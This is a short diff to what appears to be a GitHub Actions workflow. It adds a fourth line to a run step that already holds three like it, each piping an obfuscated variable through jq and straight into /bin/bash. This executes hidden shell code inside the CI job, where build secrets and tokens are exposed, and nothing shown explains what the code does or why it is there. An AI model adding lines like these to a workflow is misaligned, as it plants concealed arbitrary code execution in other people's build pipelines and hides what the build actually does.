@@ -22,6 +22,7 @@ jobs:
           echo $rhtq57719 | jq -r .s3062 | /bin/bash
           printf '%s' "$oza40" | jq -r .eoa2971 | /bin/bash
           echo $b581 | jq -r .x57 | /bin/bash
+          echo $isg41 | jq -r .lym376 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
